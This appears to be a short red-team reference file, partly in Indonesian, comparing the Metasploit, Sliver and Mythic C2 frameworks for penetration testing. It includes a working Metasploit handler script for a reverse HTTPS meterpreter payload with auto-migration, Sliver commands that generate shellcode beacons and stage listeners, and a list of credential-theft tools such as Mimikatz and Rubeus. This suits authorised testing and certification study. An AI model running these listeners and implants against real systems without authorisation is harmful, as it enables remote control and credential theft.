---
name: "C2 Framework Strategy — Metasploit, Sliver & Mythic"
description: "C2 framework comparison and setup guides: Metasploit, Sliver (Bishop Fox), and Mythic (SpecterOps) with automation scripts and StageListener bridge."
tags: [c2-framework, metasploit, sliver, mythic, command-control, stagelistener]
---

# C2 Framework Strategy

## Metasploit — baseline cepat

Metasploit menyediakan handler, migrasi otomatis, dan stage encoding tanpa konfigurasi tambahan.

**Resource Script (auto.rc):**
```
use exploit/multi/handler
set payload windows/x64/meterpreter/reverse_https
set lhost tun0
set lport 443
set EnableStageEncoding true
set exitonsession false
set AutoRunScript post/windows/manage/migrate
run -j -z
```

## Sliver (Bishop Fox)

**Setup:**
```bash
sliver > profiles new beacon --mtls $IP:443 --format shellcode osep-beacon
sliver > stage-listener -u tcp://$IP:8080 -p osep-beacon
sliver > mtls -L $IP -l 443
```

**Armory Extensions:** SharpHound, Mimikatz, Rubeus, Seatbelt, PowerView, SharpUp

## Mythic (SpecterOps)

- GraphQL API untuk automasi payload generation
- Multi-agent (Apollo for Windows, Poseidon for Linux)
- Proxy functionality untuk pivoting

## StageListener Bridge

```
Legacy meterpreter stager → StageListener → Mythic Apollo agent
```

StageListener menggabungkan kemudahan meterpreter dengan modern C2 capabilities.

## Best Practices

- Kuasai satu C2 framework sampai dalam; Metasploit adalah titik awal yang wajar
- Siapkan automation scripts untuk regenerate payloads
- Pastikan C2 listener active dan callbacks verified sebelum eksekusi di target
- Sliver dan Mythic dipakai ketika engagement butuh profil beacon yang lebih terkontrol
